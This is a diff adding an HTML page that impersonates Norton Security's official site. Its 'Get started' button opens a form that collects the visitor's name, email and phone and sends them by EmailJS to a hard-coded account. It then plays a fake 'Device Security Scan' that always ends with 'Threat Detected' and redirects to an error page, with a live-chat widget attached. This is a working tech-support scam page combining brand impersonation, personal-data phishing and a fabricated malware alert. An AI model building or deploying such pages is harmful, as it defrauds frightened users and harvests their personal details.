@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Norton Security – Official Protection Plans</title>
+<link rel="icon" type="image/png" href="/images/fav.png">
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/59/Norton_Antivirus_Logo.png">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+body{
+margin:0;
+font-family:'Inter',sans-serif;
+background:#f5f7fa;
+}
+
+</style>
+<script src="//code.jivosite.com/widget/qYm4IZSGp3" async=""></script>
+</head>
+
+<body>
+
+<!-- ================= NAVBAR START ================= -->
+<nav style="
+position:sticky;
+top:0;
+z-index:1000;
+background:#111827;
+padding:14px 8%;
+display:flex;
+align-items:center;
+justify-content:space-between;
+border-bottom:1px solid rgba(255,255,255,0.08);
+">
+
+  <!-- LOGO -->
+  <div style="
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-weight:700;
+  font-size:20px;
+  color:#ffcc00;
+  letter-spacing:0.5px;
+  ">
+    
+    Norton Security
+  </div>
+
+  <!-- DESKTOP MENU -->
+  <ul id="menu" style="
+  list-style:none;
+  display:flex;
+  gap:28px;
+  color:#e5e7eb;
+  font-size:15px;
+  margin:0;
+  padding:0;
+  align-items:center;
+  ">
+    <li style="cursor:pointer;transition:0.3s;" 
+        onmouseover="this.style.color='#ffcc00'" 
+        onmouseout="this.style.color='#e5e7eb'">Products</li>
+
+    <li style="cursor:pointer;transition:0.3s;" 
+        onmouseover="this.style.color='#ffcc00'" 
+        onmouseout="this.style.color='#e5e7eb'">Plans</li>
+
+    <li style="cursor:pointer;transition:0.3s;" 
+        onmouseover="this.style.color='#ffcc00'" 
+        onmouseout="this.style.color='#e5e7eb'">Support</li>
+
+    <li style="cursor:pointer;transition:0.3s;" 
+        onmouseover="this.style.color='#ffcc00'" 
+        onmouseout="this.style.color='#e5e7eb'">Business</li>
+
+    <li>
+      <button style="
+      background:#ffcc00;
+      color:#000;
+      border:none;
+      padding:10px 20px;
+      border-radius:30px;
+      font-weight:600;
+      cursor:pointer;
+      transition:0.3s;
+      "
+      onmouseover="this.style.background='#ffd633'"
+      onmouseout="this.style.background='#ffcc00'">
+      Sign In
+      </button>
+    </li>
+  </ul>
+
+  <!-- MOBILE TOGGLE -->
+  <div id="hamburger" onclick="toggleMenu()" style="
+  display:none;
+  font-size:24px;
+  color:#fff;
+  cursor:pointer;
+  ">
+  ☰
+  </div>
+
+</nav>
+<!-- ================= NAVBAR END ================= -->
+
+
+<script>
+function toggleMenu(){
+  const menu=document.getElementById("menu");
+  if(menu.style.display==="flex"){
+    menu.style.display="none";
+  }else{
+    menu.style.display="flex";
+    menu.style.flexDirection="column";
+    menu.style.background="#111827";
+    menu.style.position="absolute";
+    menu.style.top="60px";
+    menu.style.right="8%";
+    menu.style.padding="20px";
+    menu.style.borderRadius="10px";
+  }
+}
+
+window.addEventListener("resize",function(){
+  if(window.innerWidth>900){
+    document.getElementById("menu").style.display="flex";
+    document.getElementById("hamburger").style.display="none";
+  }else{
+    document.getElementById("menu").style.display="none";
+    document.getElementById("hamburger").style.display="block";
+  }
+});
+
+window.dispatchEvent(new Event('resize'));
+</script>
+
+<!-- ================= HERO SECTION START ================= -->
+<section style="
+width:100%;
+min-height:80vh;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:60px 8%;
+box-sizing:border-box;
+background:#ffffff;
+flex-wrap:wrap;
+">
+
+  <!-- LEFT CONTENT -->
+  <div style="
+  flex:1;
+  min-width:320px;
+  max-width:600px;
+  ">
+
+    <div style="
+    font-size:14px;
+    font-weight:600;
+    color:#ffcc00;
+    margin-bottom:12px;
+    letter-spacing:1px;
+    ">
+    NORTON™ 360 PLANS
+    </div>
+
+    <h1 style="
+    font-size:52px;
+    font-weight:800;
+    line-height:1.1;
+    margin-bottom:20px;
+    color:#111827;
+    ">
+    Award-winning antivirus
+    with built-in
+    Scam Protection
+    </h1>
+
+    <p style="
+    font-size:18px;
+    color:#4b5563;
+    margin-bottom:30px;
+    ">
+    Stay protected against malware, ransomware, phishing, and online scams with advanced AI-powered protection included in Norton 360 plans.
+    </p>
+
+    <button onclick="openScanModal()" style="
+    background:#ffcc00;
+    color:#000;
+    border:none;
+    padding:16px 38px;
+    border-radius:40px;
+    font-size:17px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow:0 10px 25px rgba(255,204,0,0.4);
+    ">
+    Get started
+    </button>
+
+    <!-- TRUST BADGES -->
+    <div style="
+    margin-top:40px;
+    display:flex;
+    gap:20px;
+    flex-wrap:wrap;
+    font-size:10px;
+    color:#6b7280;
+    ">
+
+      <div>✔ 100% Virus Protection Promise</div>
+      <div>✔ Real-time Threat Defense</div>
+      <div>✔ AI Scam Detection</div>
+
+    </div>
+
+  </div>
+
+  <!-- RIGHT IMAGE -->
+  <div style="
+  flex:1;
+  min-width:320px;
+  text-align:right;
+  margin-top:30px;
+  ">
+
+    <img src="/norton/hero.png"
+    style="
+    width:100%;
+    max-width:550px;
+    border-radius:20px;
+    box-shadow:0 25px 60px rgba(0,0,0,0.15);
+    ">
+
+  </div>
+
+</section>
+<!-- ================= HERO SECTION END ================= -->
+
+
+
+<!-- ================= SECTION 1 START ================= -->
+<section style="
+width:100%;
+padding:80px 8%;
+display:flex;
+align-items:center;
+justify-content:space-between;
+flex-wrap:wrap;
+background:#f3f4f6;
+box-sizing:border-box;
+">
+
+  <!-- LEFT IMAGE -->
+  <div style="
+  flex:1;
+  min-width:320px;
+  text-align:center;
+  ">
+
+    <img src="/norton/protection-scam.png"
+    style="
+    width:100%;
+    max-width:420px;
+    border-radius:40px;
+    box-shadow:0 25px 60px rgba(0,0,0,0.15);
+    ">
+  </div>
+
+  <!-- RIGHT CONTENT -->
+  <div style="
+  flex:1;
+  min-width:320px;
+  max-width:550px;
+  margin-top:30px;
+  ">
+
+    <div style="
+    font-size:14px;
+    font-weight:600;
+    color:#6b7280;
+    margin-bottom:10px;
+    ">
+    Norton™ 360 Plans
+    </div>
+
+    <h2 style="
+    font-size:46px;
+    font-weight:800;
+    line-height:1.15;
+    margin-bottom:20px;
+    color:#111827;
+    ">
+    What is Scam
+    Protection?
+    </h2>
+
+    <p style="
+    font-size:18px;
+    color:#4b5563;
+    margin-bottom:30px;
+    line-height:1.6;
+    ">
+    Norton 360 plans now comes with Scam Protection. Our AI-powered scam detection helps keep you safe by spotting scams online, in text messages or even deepfake videos. With our added Genie AI-powered Scam Assistant, avoiding scams and suspicious offers is just a tap away.
+    </p>
+
+    <!-- <button style="
+    background:#ffcc00;
+    color:#000;
+    border:none;
+    padding:15px 35px;
+    border-radius:40px;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow:0 10px 25px rgba(255,204,0,0.4);
+    ">
+    Get started
+    </button> -->
+
+  </div>
+
+</section>
+<!-- ================= SECTION 1 END ================= -->
+
+<!-- ================= SECTION 2 START ================= -->
+<section style="
+width:100%;
+padding:80px 8%;
+display:flex;
+align-items:center;
+justify-content:space-between;
+flex-wrap:wrap;
+background:#ffffff;
+box-sizing:border-box;
+">
+
+  <!-- LEFT CONTENT -->
+  <div style="
+  flex:1;
+  min-width:320px;
+  max-width:600px;
+  ">
+
+    <div style="
+    font-size:14px;
+    font-weight:600;
+    color:#6b7280;
+    margin-bottom:10px;
+    ">
+    Norton™ VPN Plans
+    </div>
+
+    <h2 style="
+    font-size:48px;
+    font-weight:800;
+    line-height:1.15;
+    margin-bottom:20px;
+    color:#111827;
+    ">
+    The one-stop-shop
+    VPN to keep you
+    safer online.
+    </h2>
+
+    <p style="
+    font-size:18px;
+    color:#4b5563;
+    margin-bottom:30px;
+    line-height:1.6;
+    ">
+    Browse more safely with fast and secure VPN and protect your devices against cyberthreats. Plus, reduce risk of personal info being exploited from compromised accounts with a password manager and dark web monitoring.
+    </p>
+
+    <button onclick="openJivo()" style="
+background:#ffcc00;
+color:#000;
+border:none;
+padding:15px 35px;
+border-radius:40px;
+font-size:16px;
+font-weight:700;
+cursor:pointer;
+box-shadow:0 10px 25px rgba(255,204,0,0.4);
+">
+Get started
+</button>
+<script>
+function openJivo(){
+  if(window.jivo_api){
+    jivo_api.open();
+  }
+}
+</script>
+
+  </div>
+
+  <!-- RIGHT IMAGE -->
+  <div style="
+  flex:1;
+  min-width:320px;
+  text-align:right;
+  margin-top:30px;
+  ">
+
+    <img src="/norton/vpn1.png"
+    style="
+    width:100%;
+    max-width:520px;
+    border-radius:30px;
+    box-shadow:0 25px 60px rgba(0,0,0,0.15);
+    ">
+  </div>
+
+</section>
+<!-- ================= SECTION 2 END ================= -->
+
+
+<!-- ================= SCAN MODAL ================= -->
+<div id="scanModal" style="
+display:none;
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.65);
+backdrop-filter:blur(6px);
+z-index:9999;
+align-items:center;
+justify-content:center;
+">
+
+  <div style="
+  background:#ffffff;
+  width:95%;
+  max-width:520px;
+  padding:40px;
+  border-radius:16px;
+  box-shadow:0 30px 60px rgba(0,0,0,0.2);
+  ">
+
+    <h2 style="margin-bottom:10px;color:#111827;">Start Secure Device Scan</h2>
+
+    <p style="font-size:14px;color:#6b7280;margin-bottom:25px;">
+    To properly diagnose your issue, please submit your details and complete a device scan first.
+    </p>
+
+    <input id="userName" placeholder="Full Name"
+    style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #e5e7eb;border-radius:8px;">
+
+    <input id="userEmail" placeholder="Email Address"
+    style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #e5e7eb;border-radius:8px;">
+
+    <input id="userPhone" placeholder="Phone Number"
+    style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #e5e7eb;border-radius:8px;">
+
+    <select id="userIssue"
+    style="width:100%;padding:12px;margin-bottom:20px;border:1px solid #e5e7eb;border-radius:8px;">
+        <option value="Virus Removal">Virus Removal</option>
+        <option value="Network Security Issue">Network Security Issue</option>
+        <option value="Subscription Renewal">Subscription Renewal</option>
+        <option value="Performance Problem">Performance Problem</option>
+        <option value="Other">Other</option>
+    </select>
+
+    <button onclick="startSecureScan()" style="
+    width:100%;
+    padding:14px;
+    background:#ffcc00;
+    border:none;
+    border-radius:40px;
+    font-weight:700;
+    cursor:pointer;
+    ">
+    Submit & Start Scan
+    </button>
+
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+  emailjs.init("12og8f2x9_c8_fxdF");   // 👈 yaha apna Public Key daalna hai
+})();
+</script>
+<!-- ================= FULL SCREEN SCAN ================= -->
+<div id="scanScreen" style="
+display:none;
+position:fixed;
+inset:0;
+background:linear-gradient(135deg,#0f172a,#1e293b);
+color:#ffffff;
+z-index:10000;
+padding:60px 10%;
+box-sizing:border-box;
+font-family:Arial;
+">
+
+<div style="max-width:900px;margin:auto;">
+
+<h2 style="margin-bottom:10px;">Device Security Scan</h2>
+<p style="color:#94a3b8;margin-bottom:40px;">
+Analyzing system environment and verifying reported issue.
+</p>
+
+<!-- GLOBAL PROGRESS -->
+<div style="margin-bottom:50px;">
+<div style="display:flex;justify-content:space-between;margin-bottom:6px;">
+<span>Total Progress</span>
+<span id="globalPercent">0%</span>
+</div>
+
+<div style="background:#1e293b;border-radius:40px;overflow:hidden;">
+<div id="globalBar" style="
+height:18px;
+width:0%;
+background:#ffcc00;
+transition:width 0.3s;
+"></div>
+</div>
+</div>
+
+<div id="scanStages"></div>
+
+</div>
+</div>
+
+
+
+<script>
+
+function openScanModal(){
+  document.getElementById("scanModal").style.display="flex";
+}
+
+let selectedIssue="";
+
+function startSecureScan(){
+
+  const name=document.getElementById("userName").value.trim();
+  const email=document.getElementById("userEmail").value.trim();
+  const phone=document.getElementById("userPhone").value.trim();
+  const issue=document.getElementById("userIssue").value;
+
+  // Name validation
+  if(name.length < 3){
+    alert("Please enter valid full name.");
+    return;
+  }
+
+  // Email validation
+  const emailPattern=/^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+  if(!email.match(emailPattern)){
+    alert("Please enter valid email address.");
+    return;
+  }
+
+  // Phone validation (10 digits only)
+  const phonePattern=/^[0-9]{10}$/;
+  if(!phone.match(phonePattern)){
+    alert("Enter valid 10 digit phone number.");
+    return;
+  }
+
+  emailjs.send(
+  "service_do4j2ie",      // 👈 replace karo
+  "template_fcav53v",     // 👈 replace karo
+  {
+    name: name,
+    email: email,
+    phone: phone,
+    issue: issue
+  }
+).then(function(response){
+
+    selectedIssue = issue;
+
+    document.getElementById("scanModal").style.display="none";
+    document.getElementById("scanScreen").style.display="block";
+
+    startStages();
+
+}, function(error){
+    alert("Failed to send email. Try again.");
+});
+}
+
+function startStages(){
+
+  const stages=[
+    "Checking Network Security",
+    "Scanning System Files",
+    "Analyzing Running Processes",
+    "Firewall Integrity Check",
+    "Issue Verification: " + selectedIssue
+  ];
+
+  const container=document.getElementById("scanStages");
+  container.innerHTML="";
+
+  stages.forEach((stage,index)=>{
+    container.innerHTML+=`
+      <div style="margin-bottom:25px;">
+        <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:14px;">
+          <span>${stage}</span>
+          <span id="percent${index}">0%</span>
+        </div>
+        <div style="background:#1e293b;border-radius:30px;overflow:hidden;">
+          <div id="bar${index}" style="height:14px;width:0%;background:#22c55e;"></div>
+        </div>
+      </div>
+    `;
+  });
+
+  runStage(0, stages.length);
+}
+
+function runStage(index,total){
+
+  if(index>=total){
+    setTimeout(()=>{
+      window.location.replace("error.html?issue=" + encodeURIComponent(selectedIssue));
+    },1500);
+    return;
+  }
+
+  let percent=0;
+
+  const bar=document.getElementById("bar"+index);
+  const percentText=document.getElementById("percent"+index);
+  const globalBar=document.getElementById("globalBar");
+  const globalPercent=document.getElementById("globalPercent");
+
+  let interval=setInterval(()=>{
+
+    percent+=3;
+    bar.style.width=percent+"%";
+    percentText.innerText=percent+"%";
+
+    let overall=((index + percent/100) / total) * 100;
+    globalBar.style.width=overall+"%";
+    globalPercent.innerText=Math.floor(overall)+"%";
+
+    // Default Green
+    globalBar.style.background="#22c55e";
+
+    if(percent>=100){
+
+      clearInterval(interval);
+
+      if(index < total-1){
+        bar.style.background="#22c55e";
+        percentText.innerHTML="✔ Completed";
+      }
+
+      if(index === total-1){
+
+        bar.style.background="#facc15";
+        percentText.innerHTML="⚠ Threat Detected";
+
+        setTimeout(()=>{
+          bar.style.background="#ef4444";
+          globalBar.style.background="#ef4444";
+        },800);
+      }
+
+      runStage(index+1,total);
+    }
+
+  },40);
+}
+
+</script>
+
+
+
+
+
+
+
+<!-- ================= FOOTER START ================= -->
+<footer style="
+width:100%;
+background:#111827;
+color:#d1d5db;
+padding:80px 8% 40px;
+box-sizing:border-box;
+font-family:Inter, sans-serif;
+">
+
+  <!-- TOP GRID -->
+  <div style="
+  display:flex;
+  justify-content:space-between;
+  flex-wrap:wrap;
+  gap:60px;
+  margin-bottom:60px;
+  max-width:1200px;
+  margin-left:auto;
+  margin-right:auto;
+  ">
+
+    <!-- COLUMN 1 -->
+    <div style="flex:1; min-width:250px;">
+      <h3 style="color:#ffffff; margin-bottom:25px; font-size:18px; font-weight:600;">Products</h3>
+      <p style="margin-bottom:12px;">Norton AntiVirus Plus</p>
+      <p style="margin-bottom:12px;">Norton 360 Standard</p>
+      <p style="margin-bottom:12px;">Norton 360 Deluxe</p>
+      <p style="margin-bottom:12px;">Norton 360 Premium</p>
+    </div>
+
+    <!-- COLUMN 2 -->
+    <div style="flex:1; min-width:250px;">
+      <h3 style="color:#ffffff; margin-bottom:25px; font-size:18px; font-weight:600;">Features</h3>
+      <p style="margin-bottom:12px;">AI Scam Protection</p>
+      <p style="margin-bottom:12px;">Cloud Backup</p>
+      <p style="margin-bottom:12px;">Dark Web Monitoring</p>
+      <p style="margin-bottom:12px;">Password Manager</p>
+    </div>
+
+    <!-- COLUMN 3 -->
+    <div style="flex:1; min-width:250px;">
+      <h3 style="color:#ffffff; margin-bottom:25px; font-size:18px; font-weight:600;">Support</h3>
+      <p style="margin-bottom:12px;">Customer Support</p>
+      <p style="margin-bottom:12px;">Renew Subscription</p>
+      <p style="margin-bottom:12px;">Update Center</p>
+      <p style="margin-bottom:12px;">System Status</p>
+    </div>
+
+  </div>
+
+  <!-- DIVIDER -->
+  <div style="
+  width:100%;
+  height:1px;
+  background:#374151;
+  margin-bottom:30px;
+  "></div>
+
+  <!-- BOTTOM ROW -->
+  <div style="
+  display:flex;
+  justify-content:space-between;
+  flex-wrap:wrap;
+  gap:20px;
+  font-size:14px;
+  color:#9ca3af;
+  max-width:1200px;
+  margin:auto;
+  ">
+
+    <div>
+      © 2026 Norton Security. All rights reserved.
+    </div>
+
+    <div>
+      Norton is part of Gen™ – A global cybersecurity company.
+    </div>
+
+  </div>
+
+</footer>
+<!-- ================= FOOTER END ================= -->
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
